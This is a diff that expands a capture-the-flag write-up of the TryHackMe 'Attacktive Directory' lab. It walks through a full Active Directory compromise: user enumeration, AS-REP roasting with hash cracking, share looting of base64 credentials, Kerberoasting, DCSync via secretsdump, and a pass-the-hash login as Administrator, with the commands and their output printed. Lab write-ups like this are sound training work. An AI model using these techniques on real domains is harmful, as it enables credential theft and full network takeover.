@@ -48,6 +48,8 @@ tags:
 
 ### Nmap scan
 
+Every Active Directory box starts the same way for me: a full port scan to see what services are actually exposed before I decide where to spend my time. The results here read like a textbook domain controller, which immediately told me this engagement was going to be about AD enumeration and credential abuse rather than a web application exploit.
+
 ```bash
 Host is up, received user-set (0.089s latency).
 Scanned at 2024-05-06 20:59:06 EDT for 285s
@@ -136,6 +138,8 @@ Host script results:
 |_  start_date: N/A
 ```
 
+
+With ports 88, 389, and 445 all confirming a domain controller, my first move was unauthenticated enumeration against SMB and RPC, since AD environments frequently allow null sessions or anonymous binds that leak far more than administrators expect. `enum4linux` bundles a lot of that enumeration into one pass, so I started there.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 20:56]
@@ -295,19 +299,19 @@ do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 enum4linux complete on Mon May  6 21:05:50 2024
 ```
 
-Afterwards I used `crackmapexec` to enumerate the AD Network for users. I used the following command to `rid-brute`.
+Even without valid credentials, `enum4linux`'s RID cycling walked the domain SID and handed back a long list of account names, which on its own is already a meaningful information disclosure: an anonymous connection should never be able to enumerate the entire user base of a domain. To build on that and make sure I had not missed anything, I ran `crackmapexec` with `--rid-brute` as a second, independent pass over the same technique.
 
 ```bash
 crackmapexec smb 10.10.80.158 -u '' -p '' --rid-brute > u.txt
 ```
 
-Afterwards I then parsed the `u.txt` to separate the `crackmapexec` output from the users and the domain name. 
+That raw output is not directly usable as a wordlist, though, it is full of formatting noise and the domain SID prefix, so I parsed `u.txt` down with a chain of `grep`, `rev`, and `cut` to isolate just the bare usernames I would need for the next stage.
 
 ```bash
 cat u.txt |grep -i user |rev |cut -f2 -d ' ' |rev |grep THM-AD |cut -f2 -d '\' |grep -Ev (DC|SVC) |tail -n +4 > users.txt
 ```
 
-I then got the following users. I also went in with `kerbrute` just in case if I had missed any users.
+That gave me a clean list of usernames to work from. I also ran `kerbrute` against the same target independently, since it validates usernames through the Kerberos pre-authentication response rather than SMB RID enumeration, and cross-checking two different techniques is a cheap way to catch anything one method alone might have missed.
 
 ```bash
 ATTACKTIVEDIREC$
@@ -333,9 +337,11 @@ a-spooks
 
 ```
 
+`kerbrute` did not surface anything the RID cycling had not already found, which was reassuring rather than wasted effort, it meant I could trust the user list I already had going forward. With a confirmed set of valid domain accounts in hand, the next logical check was whether any of them had blank or misconfigured passwords, so I went back to `crackmapexec` to spray each username against SMB with an empty password.
+
 ### Going back with crackmapexec
 
-I used crackmapexec to see if the first list of users are able to access anything on the domain without a password and got the following results.
+Here is what that empty-password spray against the full user list turned up.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 21:13]
@@ -358,9 +364,7 @@ SMB         10.10.80.158    445    ATTACKTIVEDIREC  [-] spookysec.local\backup: 
 SMB         10.10.80.158    445    ATTACKTIVEDIREC  [-] spookysec.local\a-spooks: STATUS_LOGON_FAILURE
 ```
 
-We now know that the domain controller name is `spookysec.local`. 
-
-Did some asrep roasting and got the users `svc-admin`.
+Every single account failed that empty-password spray, which ruled out that avenue entirely, but the output was still useful: it confirmed the domain name as `spookysec.local`, which I would need for every subsequent Kerberos-aware tool. With that confirmed and no blank passwords to exploit, I moved to a technique that does not need a password guess at all: AS-REP roasting targets any account with Kerberos pre-authentication disabled, requesting a ticket for it and getting back a piece of material that can be cracked offline rather than bruteforced live against the DC.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 21:30]
@@ -384,7 +388,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:75f9751124e0cf7f338fa5cd7fb100da$850ec16
 [-] User a-spooks doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-Was able to crack the hash with `hashcat`.
+Running `GetNPUsers.py` against the full user list flagged exactly one account, `svc-admin`, as not requiring pre-authentication, and handed back its AS-REP hash. Service accounts are disproportionately likely to have this misconfiguration since they are often set up once and forgotten, and that pattern held true here. With the hash in hand, offline cracking was the obvious next step, so I handed it to `hashcat` against `rockyou.txt`.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 21:32]
@@ -463,7 +467,7 @@ Started: Mon May  6 21:33:07 2024
 Stopped: Mon May  6 21:33:17 2024
 ```
 
-Afterwards I used `bloodhound-python` to enumerate the network.
+Hashcat made short work of the AS-REP hash and recovered `svc-admin`'s cleartext password, `management2005`, giving me my first real foothold identity in the domain. With actual credentials to authenticate with, my priority shifted to understanding this account's position in the wider AD environment, specifically what group memberships and permissions it carried that might not be obvious from a plain `whoami`. `bloodhound-python` collects exactly that kind of relationship data over LDAP and SMB, so I pointed it at the domain using the new credentials.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory/bloodhound-recon1] - [Mon May 06, 21:38]
@@ -488,9 +492,7 @@ INFO: Done in 00M 21S
 
 ![Pasted image 20240506214216](Pasted-image-20240506214216.png)
 
-After putting everything into `bloodhound` I found that this user can use `RDP` so then I logged in using `RDP` and was able to login.
-
-I went back with `crackmapexec` and found shares with the credentials.
+Loading the collected data into the BloodHound GUI and graphing `svc-admin`'s reachable rights showed it had RDP access to the domain controller, an easy way to get eyes-on access without needing anything more sophisticated, so I connected over RDP and confirmed it logged in cleanly. In parallel, I also wanted to see what these credentials could reach over SMB specifically, so I went back to `crackmapexec` to enumerate shares.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 22:08]
@@ -508,7 +510,7 @@ SMB         10.10.80.158    445    ATTACKTIVEDIREC  NETLOGON        READ        
 SMB         10.10.80.158    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
 ```
 
-Enumerated with `smbmap`.
+A `backup` share with `READ` access stood out immediately, since a share by that name is almost always worth checking for leftover credentials or configuration data. I cross-checked the same access with `smbmap` as well, partly out of habit and partly because different tools occasionally surface access that one alone misses.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 22:11]
@@ -540,7 +542,7 @@ Enumerated with `smbmap`.
 ```
 
 
-I then accessed using smbclient
+Both tools agreed on the `backup` share being readable, so I connected to it directly with `smbclient` to see what was actually sitting inside.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 22:16]
@@ -555,9 +557,9 @@ smb: \>
 backup@spookysec.local:backup2517860   
 ```
 
-the credentials file was base64
+Inside the share sat a file named `backup_credentials.txt`, and rather than plaintext, its content turned out to be a base64 string, which decoded cleanly into a second set of domain credentials for a `backup` account.
 
-Then used `targetKerberoast` to do kerberoasting.
+With a second identity in hand, I wanted to check whether Kerberoasting would open up anything further. Since I did not yet know which accounts, if any, actually had SPNs registered, I used `targetedKerberoast`, which can add a temporary SPN to accounts it has write access to before requesting and printing the ticket, rather than relying only on accounts that already happen to be service accounts.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Mon May 06, 22:24]
@@ -617,7 +619,7 @@ $krb5tgs$23$*svc-admin$SPOOKYSEC.LOCAL$spookysec.local/svc-admin*$f3e83db1da95f0
 $krb5tgs$23$*backup$SPOOKYSEC.LOCAL$spookysec.local/backup*$a7a3995cf76e4c1c69149285b4f39a21$3f67120939b15ad407673a00aa35f55c742b0c3fe107633eced404a9a29e3a996b25d361bc8f94253e739b8ae04d2584345026b9ede70f2a6738aff1d12f1bfd958af5413936c46013e7d2442249003e49322391d4243a24236faf31762b6396e1c65edbce04645f7a91a619a87dade94ae432ce3f7beac7833ed9fd5bd2060af8ba950cd29b612abf5789960bffc0540acff92554c99b5620d5a3c7bb94b8c0d6e5919fe6f94e400196b9fdf0a5f66bfd0ad28093a5219c2e4869f56b0c3efb230824984b27e6ed3d61ec2adb4d10e9d7cbe45e939b90bb1ec36a8831b20e66e7a1e4e0f1742ee2152e0d3dcc63b0e4ab6989eb7fddb02d5b0d40e04e70e7cea389bc80990ece4aa40e6bbbabeb50a564d81049bd2e1677172191ca1e415dd27d3c2616e4d609a04ca47b7468f88e01478da109f52278cbe8f2d534e188dbfc8aeaa1bb125f8c3a4fde4839350c624c8ad8eea5cac9f8aa795862a4591d88407b7838341b2cae187ea600faa4a5804d6ffa61135fe9f8b934007be1a42057f5ae802e69dcd6e2500322774b776fb1090750836e91ba862f5ae18100c1f374fc09bdcdff166dfc744ffa2eb6463606b9dd9652e26e91190e056c7c4b5ca7586c8912f23ac00451dde5eff769971f49baabcb48ba8f136526b37d56a5a110d6d84321662bf86ad31a403ddcf4f56e230f5a8a354d9d0aaf1349fac3742c1177917a832d5e0fc2193215308d54b4428cd88377b7489d446057e9d1ce88ca6cc4ec6052ec985b2afe4c469e5f04b9fa8c9993f58cf33d87935cdbd40ad1de32e927d12d32ebc7edb57dcfe9ab7cf107577ced722b417722835feca9ddcb899eaef271e571037aad67f37f1437a30d265510f29a2a4acf775dd483ce781594a91ac8efe002f04bc3de2721ed17e2ebc8c8fe2e7aac51eef0ffbf9c6945e6a33651ab043e981429cad3ba9e500340cfd2ba03acd5f53a8fbec74b8acc2e6135bd70659814678b41b60f8bd4a1c813613aba8a2429b04bb74e4ac97c64281540dae19e5d4bef90dd9e2457d3604c05dd07cd9add636fc9c6b239ab547002415725dd072b2618788cf1c366e2e3ecd6c1866b4b80549db33e6b2caecc481149aded9aa216f4c5603e369dce6ef5c87873d203bf12e4e5ab4bcfb4adb236761cffbd6fc91ecd3846135a62131e67ae71bf04581651e93d4cc99ebf48858039ed108e74dddd5c67da88a826cde5e160925056907d18b59db7253cfdac238238556ba755479da7c082792a228cc013015613640d82e46dc1dc4c1c13dd380556fef1c1f6190c335f67d373d8a036b737859c562e1a06b47c714231
 ```
 
-Looking back at bloodhound I backup is essentially a domain admin so we can try to use secrets dump.
+That kerberoasting attempt handed back TGS tickets for essentially every user, but rather than spend time cracking each one, I went back to what BloodHound had already told me: the `backup` account holds the **"Replicating Directory Changes"** and **"Replicating Directory Changes All"** rights on the domain, the two ACL entries that together make DCSync possible. In practice that means `backup` can request the domain controller replicate credential data to it exactly as if it were a peer DC, without ever needing a shell on the box itself. With valid `backup` credentials already in hand from the earlier share, running `secretsdump.py` against the domain was the natural way to cash that permission in for every NTLM hash and Kerberos key in the environment.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Attacktive Directory] - [Tue May 07, 20:12]
@@ -709,3 +711,5 @@ Evil-WinRM shell v3.5
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
+
+With the Administrator NT hash pulled straight out of that dump, there was no need to crack anything further. NTLM authentication accepts the hash itself in place of the plaintext password, so passing it directly to `evil-winrm` gave me an interactive session as Administrator on the domain controller, full domain compromise, and both flags, without ever needing to know the actual password.
